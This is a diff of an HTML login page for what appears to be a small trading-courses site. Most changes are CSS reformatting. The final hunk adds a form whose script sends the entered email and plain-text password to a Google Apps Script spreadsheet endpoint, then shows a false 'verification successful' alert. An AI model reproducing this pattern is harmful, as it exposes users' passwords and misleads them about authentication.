@@ -8,7 +8,9 @@
     <link href="https://cdn.jsdelivr.net/npm/remixicon@4.3.0/fonts/remixicon.css" rel="stylesheet" />
 
     <link href="https://cdn.jsdelivr.net/npm/remixicon@4.3.0/fonts/remixicon.css" rel="stylesheet" />
-    <link rel="shortcut icon" href="https://uxwing.com/wp-content/themes/uxwing/download/business-professional-services/candlestick-icon.png" type="image/x-icon">
+    <link rel="shortcut icon"
+        href="https://uxwing.com/wp-content/themes/uxwing/download/business-professional-services/candlestick-icon.png"
+        type="image/x-icon">
     <style>
         * {
             margin: 0;
@@ -111,10 +113,16 @@
             display: none;
         }
 
-        .login {
+        form {
             position: relative;
             top: 30%;
             left: 15%;
+        }
+
+        .login {
+            position: relative;
+            /* top: 30%;
+            left: 15%; */
             width: 20%;
             height: 55%;
             background-size: cover;
@@ -141,6 +149,7 @@
 
         .login .inp1 {
             width: 100%;
+            height: 3rem;
             display: flex;
             margin-left: 15%;
             margin-bottom: 5%;
@@ -156,7 +165,7 @@
             border-radius: 80px;
             border: 1px solid white;
             background-color: white;
-            box-shadow:inset 0px 5px 5px black, 8px 8px 10px black,-4px -4px 10px white;
+            box-shadow: inset 0px 5px 5px black, 8px 8px 10px black, -4px -4px 10px white;
             outline: none;
 
         }
@@ -180,7 +189,7 @@
             border: none;
             border-radius: 8px;
             transition: 0.2s;
-            
+
         }
 
         button::after {
@@ -284,7 +293,8 @@
         .login .p3 span {
             text-decoration: underline;
         }
-        .login button a{
+
+        .login button a {
             font-weight: bold;
             color: white;
             text-decoration: none;
@@ -316,10 +326,11 @@
             .menu-option {
                 display: block;
             }
-            .subhome{
+
+            .subhome {
                 background-color: green;
                 border-top-left-radius: 20px;
-            border-bottom-right-radius: 20px;
+                border-bottom-right-radius: 20px;
             }
 
             .menu-option .ri-menu-3-line {
@@ -345,10 +356,16 @@
                 width: 100%;
             }
 
+            form {
+                position: relative;
+                top: 15%;
+                left: 0%;
+            }
+
             .login {
                 position: relative;
-                left: 7%;
-                top: 15%;
+                /* left: 7%;
+                top: 15%; */
                 width: 85%;
                 height: 52%;
                 border: 1px solid white;
@@ -423,7 +440,7 @@
             }
 
             .login .p3 {
-                
+
                 text-transform: capitalize;
             }
 
@@ -432,6 +449,7 @@
             }
 
         }
+
         @media (min-width:340px) and (max-width:740px) {
             body {
 
@@ -454,10 +472,11 @@
             .menu-option {
                 display: block;
             }
-            .subhome{
+
+            .subhome {
                 background-color: green;
                 border-top-left-radius: 20px;
-            border-bottom-right-radius: 20px;
+                border-bottom-right-radius: 20px;
             }
 
             .menu-option .ri-menu-3-line {
@@ -481,6 +500,11 @@
                 justify-content: space-between;
                 align-items: center;
                 width: 100%;
+            }
+            form {
+                position: relative;
+                top: 15%;
+                left: 0%;
             }
 
             .login {
@@ -561,7 +585,7 @@
             }
 
             .login .p3 {
-                
+
                 text-transform: capitalize;
             }
 
@@ -570,6 +594,7 @@
             }
 
         }
+
         @media (min-width:810px) and (max-width:1080px) {
             body {
 
@@ -592,10 +617,11 @@
             .menu-option {
                 display: block;
             }
-            .subhome{
+
+            .subhome {
                 background-color: green;
                 border-top-left-radius: 20px;
-            border-bottom-right-radius: 20px;
+                border-bottom-right-radius: 20px;
             }
 
             .menu-option .ri-menu-3-line {
@@ -620,11 +646,16 @@
                 align-items: center;
                 width: 100%;
             }
+            form {
+                position: relative;
+                top: 15%;
+                /* left: 4%; */
+            }
 
             .login {
                 position: relative;
-                left: 7%;
-                top: 15%;
+                left: 8%;
+                /* top: 15%; */
                 width: 85%;
                 height: 80%;
                 border: 1px solid white;
@@ -700,7 +731,7 @@
             }
 
             .login .p3 {
-                
+
                 text-transform: capitalize;
             }
 
@@ -730,9 +761,9 @@
                 <a href="aboutt.html"><i class="ri-folder-video-line"> courses</i></a>
 
             </li>
-           
-           
-           
+
+
+
             <li class="menu-option">
                 <a href="#"><i class="ri-folder-video-line"></i>courses</a>
                 <div class="sub">
@@ -748,31 +779,49 @@
             </li>
         </ul>
     </nav>
+    <form method="post" name="google-sheet">
+        <div class="login">
+            <p class="p1">welcome</p>
+            <div class="inp1">
+                <div class="inp1-logo"><i class="ri-user-line"></i></div>
+                <input type="email" placeholder="email123@gmail.com" name="email">
+            </div>
+            <div class="inp1">
+                <div class="inp1-logo"><i class="ri-lock-line"></i></div>
+                <input type="password" placeholder="********" name="password">
+            </div>
+            <button type="submit" name="submit">log in</button>
+            <p class="p2">or login with</p>
+            <div class="social">
+                <div class="google">
+                    <div class="google-logo"></div>
+                    <div class="google-name">Google</div>
+                </div>
+                <div class="facebook">
+                    <div class="facebook-logo"></div>
+                    <div class="facebook-name">Facebook</div>
+                </div>
+            </div>
+            <p class="p3">not a member&#63 <span>sign up now</span></p>
+        </div>
+    </form>
 
-    <div class="login">
-        <p class="p1">welcome</p>
-        <div class="inp1">
-            <div class="inp1-logo"><i class="ri-user-line"></i></div>
-            <input type="email" placeholder="email123@gmail.com">
-        </div>
-        <div class="inp1">
-            <div class="inp1-logo"><i class="ri-lock-line"></i></div>
-            <input type="password" placeholder="********">
-        </div>
-        <button type="submit"><a href="aboutt.html">Login</a></button>
-        <p class="p2">or login with</p>
-        <div class="social">
-            <div class="google">
-                <div class="google-logo"></div>
-                <div class="google-name">Google</div>
-            </div>
-            <div class="facebook">
-                <div class="facebook-logo"></div>
-                <div class="facebook-name">Facebook</div>
-            </div>
-        </div>
-        <p class="p3">not a member&#63 <span>sign up now</span></p>
-    </div>
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbzHF2AznttI6g_UqklgDoWoEW2r-J_NWfB9u-Bcm8JEX6jxsxyLJzr0qH_1fyWA8AcY/exec';
+        const form = document.forms['google-sheet'];
+        const redirectURL = 'aboutt.html'; // Change this to your redirect URL
+
+        form.addEventListener('submit', e => {
+            e.preventDefault();
+            fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+                .then(response => {
+                    alert("verification successful .");
+                    window.location.href = redirectURL;
+                })
+                .catch(error => console.error('Error!', error.message));
+        });
+    </script>
+
 </body>
 
 </html>
